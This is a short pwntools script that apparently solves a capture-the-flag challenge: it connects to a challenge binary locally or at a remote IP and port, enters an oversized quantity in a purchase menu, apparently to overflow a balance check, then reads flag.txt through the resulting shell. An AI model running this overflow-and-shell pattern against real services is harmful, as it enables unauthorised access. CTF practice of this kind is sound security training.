#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = './index_1'
HOST = '103.77.175.40'
PORT = 6041

exe = ELF(exe_path, checksec=False)
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
break *main
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

# add payload, script here
s = b'9999999999999999'
p.sendlineafter(b'purchase: ', b'4')
p.sendlineafter(b'want? ', s)
p.sendlineafter(b'purchase: ', b'6')
p.sendline(b'cat flag.txt')
p.interactive()
